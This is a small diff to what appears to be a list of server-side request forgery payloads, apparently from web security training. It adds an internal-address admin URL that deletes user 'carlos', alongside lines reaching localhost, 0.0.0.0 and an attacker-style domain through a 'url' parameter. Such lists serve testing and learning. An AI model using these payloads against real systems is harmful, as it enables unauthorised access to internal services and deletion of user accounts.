@@ -7,3 +7,5 @@ http://demo.libcurl.so/?url=http://0.0.0.0:1234
 http://demo.libcurl.so/?url=http://assets.demo.com.hackingwithdemo.link:1234/hacker.txt
 
 http://localhost/admin/delete?username=carlos
+
+http://192.168.0.1:8080/admin/delete?username=carlos
